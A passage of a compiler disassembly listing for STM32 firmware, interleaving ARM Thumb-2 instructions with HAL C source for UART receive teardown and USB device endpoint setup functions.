   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005cdc:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8005cde:	e853 3f00 	ldrex	r3, [r3]
 8005ce2:	633b      	str	r3, [r7, #48]	; 0x30
   return(result);
 8005ce4:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8005ce6:	f423 7390 	bic.w	r3, r3, #288	; 0x120
 8005cea:	64fb      	str	r3, [r7, #76]	; 0x4c
 8005cec:	687b      	ldr	r3, [r7, #4]
 8005cee:	681b      	ldr	r3, [r3, #0]
 8005cf0:	461a      	mov	r2, r3
 8005cf2:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 8005cf4:	643b      	str	r3, [r7, #64]	; 0x40
 8005cf6:	63fa      	str	r2, [r7, #60]	; 0x3c
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005cf8:	6bf9      	ldr	r1, [r7, #60]	; 0x3c
 8005cfa:	6c3a      	ldr	r2, [r7, #64]	; 0x40
 8005cfc:	e841 2300 	strex	r3, r2, [r1]
 8005d00:	63bb      	str	r3, [r7, #56]	; 0x38
   return(result);
 8005d02:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8005d04:	2b00      	cmp	r3, #0
 8005d06:	d1e6      	bne.n	8005cd6 <UART_EndRxTransfer+0x8>
  ATOMIC_CLEAR_BIT(huart->Instance->CR3, USART_CR3_EIE);
 8005d08:	687b      	ldr	r3, [r7, #4]
 8005d0a:	681b      	ldr	r3, [r3, #0]
 8005d0c:	3308      	adds	r3, #8
 8005d0e:	623b      	str	r3, [r7, #32]
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005d10:	6a3b      	ldr	r3, [r7, #32]
 8005d12:	e853 3f00 	ldrex	r3, [r3]
 8005d16:	61fb      	str	r3, [r7, #28]
   return(result);
 8005d18:	69fb      	ldr	r3, [r7, #28]
 8005d1a:	f023 0301 	bic.w	r3, r3, #1
 8005d1e:	64bb      	str	r3, [r7, #72]	; 0x48
 8005d20:	687b      	ldr	r3, [r7, #4]
 8005d22:	681b      	ldr	r3, [r3, #0]
 8005d24:	3308      	adds	r3, #8
 8005d26:	6cba      	ldr	r2, [r7, #72]	; 0x48
 8005d28:	62fa      	str	r2, [r7, #44]	; 0x2c
 8005d2a:	62bb      	str	r3, [r7, #40]	; 0x28
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005d2c:	6ab9      	ldr	r1, [r7, #40]	; 0x28
 8005d2e:	6afa      	ldr	r2, [r7, #44]	; 0x2c
 8005d30:	e841 2300 	strex	r3, r2, [r1]
 8005d34:	627b      	str	r3, [r7, #36]	; 0x24
   return(result);
 8005d36:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8005d38:	2b00      	cmp	r3, #0
 8005d3a:	d1e5      	bne.n	8005d08 <UART_EndRxTransfer+0x3a>
#endif /* USART_CR1_FIFOEN */

  /* In case of reception waiting for IDLE event, disable also the IDLE IE interrupt source */
  if (huart->ReceptionType == HAL_UART_RECEPTION_TOIDLE)
 8005d3c:	687b      	ldr	r3, [r7, #4]
 8005d3e:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8005d40:	2b01      	cmp	r3, #1
 8005d42:	d118      	bne.n	8005d76 <UART_EndRxTransfer+0xa8>
  {
    ATOMIC_CLEAR_BIT(huart->Instance->CR1, USART_CR1_IDLEIE);
 8005d44:	687b      	ldr	r3, [r7, #4]
 8005d46:	681b      	ldr	r3, [r3, #0]
 8005d48:	60fb      	str	r3, [r7, #12]
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005d4a:	68fb      	ldr	r3, [r7, #12]
 8005d4c:	e853 3f00 	ldrex	r3, [r3]
 8005d50:	60bb      	str	r3, [r7, #8]
   return(result);
 8005d52:	68bb      	ldr	r3, [r7, #8]
 8005d54:	f023 0310 	bic.w	r3, r3, #16
 8005d58:	647b      	str	r3, [r7, #68]	; 0x44
 8005d5a:	687b      	ldr	r3, [r7, #4]
 8005d5c:	681b      	ldr	r3, [r3, #0]
 8005d5e:	461a      	mov	r2, r3
 8005d60:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8005d62:	61bb      	str	r3, [r7, #24]
 8005d64:	617a      	str	r2, [r7, #20]
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005d66:	6979      	ldr	r1, [r7, #20]
 8005d68:	69ba      	ldr	r2, [r7, #24]
 8005d6a:	e841 2300 	strex	r3, r2, [r1]
 8005d6e:	613b      	str	r3, [r7, #16]
   return(result);
 8005d70:	693b      	ldr	r3, [r7, #16]
 8005d72:	2b00      	cmp	r3, #0
 8005d74:	d1e6      	bne.n	8005d44 <UART_EndRxTransfer+0x76>
  }

  /* At end of Rx process, restore huart->RxState to Ready */
  huart->RxState = HAL_UART_STATE_READY;
 8005d76:	687b      	ldr	r3, [r7, #4]
 8005d78:	2220      	movs	r2, #32
 8005d7a:	f8c3 2080 	str.w	r2, [r3, #128]	; 0x80
  huart->ReceptionType = HAL_UART_RECEPTION_STANDARD;
 8005d7e:	687b      	ldr	r3, [r7, #4]
 8005d80:	2200      	movs	r2, #0
 8005d82:	661a      	str	r2, [r3, #96]	; 0x60

  /* Reset RxIsr function pointer */
  huart->RxISR = NULL;
 8005d84:	687b      	ldr	r3, [r7, #4]
 8005d86:	2200      	movs	r2, #0
 8005d88:	669a      	str	r2, [r3, #104]	; 0x68
}
 8005d8a:	bf00      	nop
 8005d8c:	3754      	adds	r7, #84	; 0x54
 8005d8e:	46bd      	mov	sp, r7
 8005d90:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005d94:	4770      	bx	lr

08005d96 <USB_CoreInit>:
  * @param  cfg pointer to a USB_CfgTypeDef structure that contains
  *         the configuration information for the specified USBx peripheral.
  * @retval HAL status
  */
HAL_StatusTypeDef USB_CoreInit(USB_TypeDef *USBx, USB_CfgTypeDef cfg)
{
 8005d96:	b084      	sub	sp, #16
 8005d98:	b480      	push	{r7}
 8005d9a:	b083      	sub	sp, #12
 8005d9c:	af00      	add	r7, sp, #0
 8005d9e:	6078      	str	r0, [r7, #4]
 8005da0:	f107 0014 	add.w	r0, r7, #20
 8005da4:	e880 000e 	stmia.w	r0, {r1, r2, r3}
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */

  return HAL_OK;
 8005da8:	2300      	movs	r3, #0
}
 8005daa:	4618      	mov	r0, r3
 8005dac:	370c      	adds	r7, #12
 8005dae:	46bd      	mov	sp, r7
 8005db0:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005db4:	b004      	add	sp, #16
 8005db6:	4770      	bx	lr

08005db8 <USB_EnableGlobalInt>:
  *         Enables the controller's Global Int in the AHB Config reg
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EnableGlobalInt(USB_TypeDef *USBx)
{
 8005db8:	b480      	push	{r7}
 8005dba:	b085      	sub	sp, #20
 8005dbc:	af00      	add	r7, sp, #0
 8005dbe:	6078      	str	r0, [r7, #4]
  uint32_t winterruptmask;

  /* Clear pending interrupts */
  USBx->ISTR = 0U;
 8005dc0:	687b      	ldr	r3, [r7, #4]
 8005dc2:	2200      	movs	r2, #0
 8005dc4:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

  /* Set winterruptmask variable */
  winterruptmask = USB_CNTR_CTRM  | USB_CNTR_WKUPM |
 8005dc8:	f64b 7380 	movw	r3, #49024	; 0xbf80
 8005dcc:	60fb      	str	r3, [r7, #12]
                   USB_CNTR_SUSPM | USB_CNTR_ERRM |
                   USB_CNTR_SOFM | USB_CNTR_ESOFM |
                   USB_CNTR_RESETM | USB_CNTR_L1REQM;

  /* Set interrupt mask */
  USBx->CNTR = (uint16_t)winterruptmask;
 8005dce:	68fb      	ldr	r3, [r7, #12]
 8005dd0:	b29a      	uxth	r2, r3
 8005dd2:	687b      	ldr	r3, [r7, #4]
 8005dd4:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  return HAL_OK;
 8005dd8:	2300      	movs	r3, #0
}
 8005dda:	4618      	mov	r0, r3
 8005ddc:	3714      	adds	r7, #20
 8005dde:	46bd      	mov	sp, r7
 8005de0:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005de4:	4770      	bx	lr

08005de6 <USB_DisableGlobalInt>:
  *         Disable the controller's Global Int in the AHB Config reg
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef USB_DisableGlobalInt(USB_TypeDef *USBx)
{
 8005de6:	b480      	push	{r7}
 8005de8:	b085      	sub	sp, #20
 8005dea:	af00      	add	r7, sp, #0
 8005dec:	6078      	str	r0, [r7, #4]
  uint32_t winterruptmask;

  /* Set winterruptmask variable */
  winterruptmask = USB_CNTR_CTRM  | USB_CNTR_WKUPM |
 8005dee:	f64b 7380 	movw	r3, #49024	; 0xbf80
 8005df2:	60fb      	str	r3, [r7, #12]
                   USB_CNTR_SUSPM | USB_CNTR_ERRM |
                   USB_CNTR_SOFM | USB_CNTR_ESOFM |
                   USB_CNTR_RESETM | USB_CNTR_L1REQM;

  /* Clear interrupt mask */
  USBx->CNTR &= (uint16_t)(~winterruptmask);
 8005df4:	687b      	ldr	r3, [r7, #4]
 8005df6:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8005dfa:	b29a      	uxth	r2, r3
 8005dfc:	68fb      	ldr	r3, [r7, #12]
 8005dfe:	b29b      	uxth	r3, r3
 8005e00:	43db      	mvns	r3, r3
 8005e02:	b29b      	uxth	r3, r3
 8005e04:	4013      	ands	r3, r2
 8005e06:	b29a      	uxth	r2, r3
 8005e08:	687b      	ldr	r3, [r7, #4]
 8005e0a:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  return HAL_OK;
 8005e0e:	2300      	movs	r3, #0
}
 8005e10:	4618      	mov	r0, r3
 8005e12:	3714      	adds	r7, #20
 8005e14:	46bd      	mov	sp, r7
 8005e16:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005e1a:	4770      	bx	lr

08005e1c <USB_SetCurrentMode>:
  *          This parameter can be one of the these values:
  *            @arg USB_DEVICE_MODE Peripheral mode
  * @retval HAL status
  */
HAL_StatusTypeDef USB_SetCurrentMode(USB_TypeDef *USBx, USB_ModeTypeDef mode)
{
 8005e1c:	b480      	push	{r7}
 8005e1e:	b083      	sub	sp, #12
 8005e20:	af00      	add	r7, sp, #0
 8005e22:	6078      	str	r0, [r7, #4]
 8005e24:	460b      	mov	r3, r1
 8005e26:	70fb      	strb	r3, [r7, #3]

  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */
  return HAL_OK;
 8005e28:	2300      	movs	r3, #0
}
 8005e2a:	4618      	mov	r0, r3
 8005e2c:	370c      	adds	r7, #12
 8005e2e:	46bd      	mov	sp, r7
 8005e30:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005e34:	4770      	bx	lr

08005e36 <USB_DevInit>:
  * @param  cfg  pointer to a USB_CfgTypeDef structure that contains
  *         the configuration information for the specified USBx peripheral.
  * @retval HAL status
  */
HAL_StatusTypeDef USB_DevInit(USB_TypeDef *USBx, USB_CfgTypeDef cfg)
{
 8005e36:	b084      	sub	sp, #16
 8005e38:	b480      	push	{r7}
 8005e3a:	b083      	sub	sp, #12
 8005e3c:	af00      	add	r7, sp, #0
 8005e3e:	6078      	str	r0, [r7, #4]
 8005e40:	f107 0014 	add.w	r0, r7, #20
 8005e44:	e880 000e 	stmia.w	r0, {r1, r2, r3}
  /* Prevent unused argument(s) compilation warning */
  UNUSED(cfg);

  /* Init Device */
  /* CNTR_FRES = 1 */
  USBx->CNTR = (uint16_t)USB_CNTR_FRES;
 8005e48:	687b      	ldr	r3, [r7, #4]
 8005e4a:	2201      	movs	r2, #1
 8005e4c:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  /* CNTR_FRES = 0 */
  USBx->CNTR = 0U;
 8005e50:	687b      	ldr	r3, [r7, #4]
 8005e52:	2200      	movs	r2, #0
 8005e54:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  /* Clear pending interrupts */
  USBx->ISTR = 0U;
 8005e58:	687b      	ldr	r3, [r7, #4]
 8005e5a:	2200      	movs	r2, #0
 8005e5c:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

  /*Set Btable Address*/
  USBx->BTABLE = BTABLE_ADDRESS;
 8005e60:	687b      	ldr	r3, [r7, #4]
 8005e62:	2200      	movs	r2, #0
 8005e64:	f8a3 2050 	strh.w	r2, [r3, #80]	; 0x50

  return HAL_OK;
 8005e68:	2300      	movs	r3, #0
}
 8005e6a:	4618      	mov	r0, r3
 8005e6c:	370c      	adds	r7, #12
 8005e6e:	46bd      	mov	sp, r7
 8005e70:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005e74:	b004      	add	sp, #16
 8005e76:	4770      	bx	lr

08005e78 <USB_FlushTxFifo>:
  *         This parameter can be a value from 1 to 15
            15 means Flush all Tx FIFOs
  * @retval HAL status
  */
HAL_StatusTypeDef USB_FlushTxFifo(USB_TypeDef const *USBx, uint32_t num)
{
 8005e78:	b480      	push	{r7}
 8005e7a:	b083      	sub	sp, #12
 8005e7c:	af00      	add	r7, sp, #0
 8005e7e:	6078      	str	r0, [r7, #4]
 8005e80:	6039      	str	r1, [r7, #0]
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */

  return HAL_OK;
 8005e82:	2300      	movs	r3, #0
}
 8005e84:	4618      	mov	r0, r3
 8005e86:	370c      	adds	r7, #12
 8005e88:	46bd      	mov	sp, r7
 8005e8a:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005e8e:	4770      	bx	lr

08005e90 <USB_FlushRxFifo>:
  * @brief  USB_FlushRxFifo : Flush Rx FIFO
  * @param  USBx : Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef USB_FlushRxFifo(USB_TypeDef const *USBx)
{
 8005e90:	b480      	push	{r7}
 8005e92:	b083      	sub	sp, #12
 8005e94:	af00      	add	r7, sp, #0
 8005e96:	6078      	str	r0, [r7, #4]
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */

  return HAL_OK;
 8005e98:	2300      	movs	r3, #0
}
 8005e9a:	4618      	mov	r0, r3
 8005e9c:	370c      	adds	r7, #12
 8005e9e:	46bd      	mov	sp, r7
 8005ea0:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005ea4:	4770      	bx	lr
	...

08005ea8 <USB_ActivateEndpoint>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_ActivateEndpoint(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 8005ea8:	b480      	push	{r7}
 8005eaa:	b09d      	sub	sp, #116	; 0x74
 8005eac:	af00      	add	r7, sp, #0
 8005eae:	6078      	str	r0, [r7, #4]
 8005eb0:	6039      	str	r1, [r7, #0]
  HAL_StatusTypeDef ret = HAL_OK;
 8005eb2:	2300      	movs	r3, #0
 8005eb4:	f887 306f 	strb.w	r3, [r7, #111]	; 0x6f
  uint16_t wEpRegVal;

  wEpRegVal = PCD_GET_ENDPOINT(USBx, ep->num) & USB_EP_T_MASK;
 8005eb8:	687a      	ldr	r2, [r7, #4]
 8005eba:	683b      	ldr	r3, [r7, #0]
 8005ebc:	781b      	ldrb	r3, [r3, #0]
 8005ebe:	009b      	lsls	r3, r3, #2
 8005ec0:	4413      	add	r3, r2
 8005ec2:	881b      	ldrh	r3, [r3, #0]
 8005ec4:	b29b      	uxth	r3, r3
 8005ec6:	f423 43ec 	bic.w	r3, r3, #30208	; 0x7600
 8005eca:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8005ece:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c

  /* initialize Endpoint */
  switch (ep->type)
 8005ed2:	683b      	ldr	r3, [r7, #0]
 8005ed4:	78db      	ldrb	r3, [r3, #3]
 8005ed6:	2b03      	cmp	r3, #3
 8005ed8:	d81f      	bhi.n	8005f1a <USB_ActivateEndpoint+0x72>
 8005eda:	a201      	add	r2, pc, #4	; (adr r2, 8005ee0 <USB_ActivateEndpoint+0x38>)
 8005edc:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8005ee0:	08005ef1 	.word	0x08005ef1
 8005ee4:	08005f0d 	.word	0x08005f0d
 8005ee8:	08005f23 	.word	0x08005f23
 8005eec:	08005eff 	.word	0x08005eff
  {
    case EP_TYPE_CTRL:
      wEpRegVal |= USB_EP_CONTROL;
 8005ef0:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 8005ef4:	f443 7300 	orr.w	r3, r3, #512	; 0x200
 8005ef8:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c
      break;
 8005efc:	e012      	b.n	8005f24 <USB_ActivateEndpoint+0x7c>
    case EP_TYPE_BULK:
      wEpRegVal |= USB_EP_BULK;
      break;

    case EP_TYPE_INTR:
      wEpRegVal |= USB_EP_INTERRUPT;
 8005efe:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 8005f02:	f443 63c0 	orr.w	r3, r3, #1536	; 0x600
 8005f06:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c
      break;
 8005f0a:	e00b      	b.n	8005f24 <USB_ActivateEndpoint+0x7c>

    case EP_TYPE_ISOC:
      wEpRegVal |= USB_EP_ISOCHRONOUS;
 8005f0c:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 8005f10:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 8005f14:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c
      break;
 8005f18:	e004      	b.n	8005f24 <USB_ActivateEndpoint+0x7c>

    default:
      ret = HAL_ERROR;
 8005f1a:	2301      	movs	r3, #1
 8005f1c:	f887 306f 	strb.w	r3, [r7, #111]	; 0x6f
      break;
 8005f20:	e000      	b.n	8005f24 <USB_ActivateEndpoint+0x7c>
      break;
 8005f22:	bf00      	nop
  }

  PCD_SET_ENDPOINT(USBx, ep->num, (wEpRegVal | USB_EP_CTR_RX | USB_EP_CTR_TX));
 8005f24:	687a      	ldr	r2, [r7, #4]
 8005f26:	683b      	ldr	r3, [r7, #0]
 8005f28:	781b      	ldrb	r3, [r3, #0]
 8005f2a:	009b      	lsls	r3, r3, #2
 8005f2c:	441a      	add	r2, r3
 8005f2e:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 8005f32:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8005f36:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8005f3a:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8005f3e:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8005f42:	b29b      	uxth	r3, r3
 8005f44:	8013      	strh	r3, [r2, #0]

  PCD_SET_EP_ADDRESS(USBx, ep->num, ep->num);
 8005f46:	687a      	ldr	r2, [r7, #4]
 8005f48:	683b      	ldr	r3, [r7, #0]
 8005f4a:	781b      	ldrb	r3, [r3, #0]
 8005f4c:	009b      	lsls	r3, r3, #2
 8005f4e:	4413      	add	r3, r2
 8005f50:	881b      	ldrh	r3, [r3, #0]
 8005f52:	b29b      	uxth	r3, r3
 8005f54:	b21b      	sxth	r3, r3
 8005f56:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8005f5a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8005f5e:	b21a      	sxth	r2, r3
 8005f60:	683b      	ldr	r3, [r7, #0]
 8005f62:	781b      	ldrb	r3, [r3, #0]
 8005f64:	b21b      	sxth	r3, r3
 8005f66:	4313      	orrs	r3, r2
 8005f68:	b21b      	sxth	r3, r3
 8005f6a:	f8a7 3066 	strh.w	r3, [r7, #102]	; 0x66
 8005f6e:	687a      	ldr	r2, [r7, #4]
 8005f70:	683b      	ldr	r3, [r7, #0]
 8005f72:	781b      	ldrb	r3, [r3, #0]
 8005f74:	009b      	lsls	r3, r3, #2
 8005f76:	441a      	add	r2, r3
 8005f78:	f8b7 3066 	ldrh.w	r3, [r7, #102]	; 0x66
 8005f7c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8005f80:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8005f84:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8005f88:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8005f8c:	b29b      	uxth	r3, r3
 8005f8e:	8013      	strh	r3, [r2, #0]

  if (ep->doublebuffer == 0U)
 8005f90:	683b      	ldr	r3, [r7, #0]
 8005f92:	7b1b      	ldrb	r3, [r3, #12]
 8005f94:	2b00      	cmp	r3, #0
 8005f96:	f040 8178 	bne.w	800628a <USB_ActivateEndpoint+0x3e2>
  {
    if (ep->is_in != 0U)
 8005f9a:	683b      	ldr	r3, [r7, #0]
 8005f9c:	785b      	ldrb	r3, [r3, #1]
 8005f9e:	2b00      	cmp	r3, #0
 8005fa0:	f000 8084 	beq.w	80060ac <USB_ActivateEndpoint+0x204>
    {
      /*Set the endpoint Transmit buffer address */
      PCD_SET_EP_TX_ADDRESS(USBx, ep->num, ep->pmaadress);
 8005fa4:	687b      	ldr	r3, [r7, #4]
 8005fa6:	61bb      	str	r3, [r7, #24]
 8005fa8:	687b      	ldr	r3, [r7, #4]
 8005faa:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8005fae:	b29b      	uxth	r3, r3
 8005fb0:	461a      	mov	r2, r3
 8005fb2:	69bb      	ldr	r3, [r7, #24]
 8005fb4:	4413      	add	r3, r2
 8005fb6:	61bb      	str	r3, [r7, #24]
 8005fb8:	683b      	ldr	r3, [r7, #0]
 8005fba:	781b      	ldrb	r3, [r3, #0]
 8005fbc:	00da      	lsls	r2, r3, #3
 8005fbe:	69bb      	ldr	r3, [r7, #24]
 8005fc0:	4413      	add	r3, r2
 8005fc2:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 8005fc6:	617b      	str	r3, [r7, #20]
 8005fc8:	683b      	ldr	r3, [r7, #0]
 8005fca:	88db      	ldrh	r3, [r3, #6]
 8005fcc:	085b      	lsrs	r3, r3, #1
 8005fce:	b29b      	uxth	r3, r3
 8005fd0:	005b      	lsls	r3, r3, #1
 8005fd2:	b29a      	uxth	r2, r3
 8005fd4:	697b      	ldr	r3, [r7, #20]
 8005fd6:	801a      	strh	r2, [r3, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 8005fd8:	687a      	ldr	r2, [r7, #4]
 8005fda:	683b      	ldr	r3, [r7, #0]
 8005fdc:	781b      	ldrb	r3, [r3, #0]
 8005fde:	009b      	lsls	r3, r3, #2
 8005fe0:	4413      	add	r3, r2
 8005fe2:	881b      	ldrh	r3, [r3, #0]
 8005fe4:	827b      	strh	r3, [r7, #18]
 8005fe6:	8a7b      	ldrh	r3, [r7, #18]
 8005fe8:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8005fec:	2b00      	cmp	r3, #0
 8005fee:	d01b      	beq.n	8006028 <USB_ActivateEndpoint+0x180>
 8005ff0:	687a      	ldr	r2, [r7, #4]
 8005ff2:	683b      	ldr	r3, [r7, #0]
 8005ff4:	781b      	ldrb	r3, [r3, #0]
 8005ff6:	009b      	lsls	r3, r3, #2
 8005ff8:	4413      	add	r3, r2
 8005ffa:	881b      	ldrh	r3, [r3, #0]
 8005ffc:	b29b      	uxth	r3, r3
 8005ffe:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006002:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006006:	823b      	strh	r3, [r7, #16]
 8006008:	687a      	ldr	r2, [r7, #4]
 800600a:	683b      	ldr	r3, [r7, #0]
 800600c:	781b      	ldrb	r3, [r3, #0]
 800600e:	009b      	lsls	r3, r3, #2
 8006010:	441a      	add	r2, r3
 8006012:	8a3b      	ldrh	r3, [r7, #16]
 8006014:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006018:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800601c:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006020:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006024:	b29b      	uxth	r3, r3
 8006026:	8013      	strh	r3, [r2, #0]

      if (ep->type != EP_TYPE_ISOC)
 8006028:	683b      	ldr	r3, [r7, #0]
 800602a:	78db      	ldrb	r3, [r3, #3]
 800602c:	2b01      	cmp	r3, #1
 800602e:	d020      	beq.n	8006072 <USB_ActivateEndpoint+0x1ca>
      {
        /* Configure NAK status for the Endpoint */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_NAK);
 8006030:	687a      	ldr	r2, [r7, #4]
 8006032:	683b      	ldr	r3, [r7, #0]
 8006034:	781b      	ldrb	r3, [r3, #0]
 8006036:	009b      	lsls	r3, r3, #2
 8006038:	4413      	add	r3, r2
 800603a:	881b      	ldrh	r3, [r3, #0]
 800603c:	b29b      	uxth	r3, r3
 800603e:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006042:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006046:	81bb      	strh	r3, [r7, #12]
 8006048:	89bb      	ldrh	r3, [r7, #12]
 800604a:	f083 0320 	eor.w	r3, r3, #32
 800604e:	81bb      	strh	r3, [r7, #12]
 8006050:	687a      	ldr	r2, [r7, #4]
 8006052:	683b      	ldr	r3, [r7, #0]
 8006054:	781b      	ldrb	r3, [r3, #0]
 8006056:	009b      	lsls	r3, r3, #2
 8006058:	441a      	add	r2, r3
 800605a:	89bb      	ldrh	r3, [r7, #12]
 800605c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006060:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006064:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006068:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800606c:	b29b      	uxth	r3, r3
 800606e:	8013      	strh	r3, [r2, #0]
 8006070:	e2d5      	b.n	800661e <USB_ActivateEndpoint+0x776>
      }
      else
      {
        /* Configure TX Endpoint to disabled state */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 8006072:	687a      	ldr	r2, [r7, #4]
 8006074:	683b      	ldr	r3, [r7, #0]
 8006076:	781b      	ldrb	r3, [r3, #0]
 8006078:	009b      	lsls	r3, r3, #2
 800607a:	4413      	add	r3, r2
 800607c:	881b      	ldrh	r3, [r3, #0]
 800607e:	b29b      	uxth	r3, r3
 8006080:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006084:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006088:	81fb      	strh	r3, [r7, #14]
 800608a:	687a      	ldr	r2, [r7, #4]
 800608c:	683b      	ldr	r3, [r7, #0]
 800608e:	781b      	ldrb	r3, [r3, #0]
 8006090:	009b      	lsls	r3, r3, #2
 8006092:	441a      	add	r2, r3
 8006094:	89fb      	ldrh	r3, [r7, #14]
 8006096:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800609a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800609e:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80060a2:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80060a6:	b29b      	uxth	r3, r3
 80060a8:	8013      	strh	r3, [r2, #0]
 80060aa:	e2b8      	b.n	800661e <USB_ActivateEndpoint+0x776>
      }
    }
    else
    {
      /* Set the endpoint Receive buffer address */
      PCD_SET_EP_RX_ADDRESS(USBx, ep->num, ep->pmaadress);
 80060ac:	687b      	ldr	r3, [r7, #4]
 80060ae:	633b      	str	r3, [r7, #48]	; 0x30
 80060b0:	687b      	ldr	r3, [r7, #4]
 80060b2:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80060b6:	b29b      	uxth	r3, r3
 80060b8:	461a      	mov	r2, r3
 80060ba:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 80060bc:	4413      	add	r3, r2
 80060be:	633b      	str	r3, [r7, #48]	; 0x30
 80060c0:	683b      	ldr	r3, [r7, #0]
 80060c2:	781b      	ldrb	r3, [r3, #0]
 80060c4:	00da      	lsls	r2, r3, #3
 80060c6:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 80060c8:	4413      	add	r3, r2
 80060ca:	f203 4304 	addw	r3, r3, #1028	; 0x404
 80060ce:	62fb      	str	r3, [r7, #44]	; 0x2c
 80060d0:	683b      	ldr	r3, [r7, #0]
 80060d2:	88db      	ldrh	r3, [r3, #6]
 80060d4:	085b      	lsrs	r3, r3, #1
 80060d6:	b29b      	uxth	r3, r3
 80060d8:	005b      	lsls	r3, r3, #1
 80060da:	b29a      	uxth	r2, r3
 80060dc:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 80060de:	801a      	strh	r2, [r3, #0]

      /* Set the endpoint Receive buffer counter */
      PCD_SET_EP_RX_CNT(USBx, ep->num, ep->maxpacket);
 80060e0:	687b      	ldr	r3, [r7, #4]
 80060e2:	62bb      	str	r3, [r7, #40]	; 0x28
 80060e4:	687b      	ldr	r3, [r7, #4]
 80060e6:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
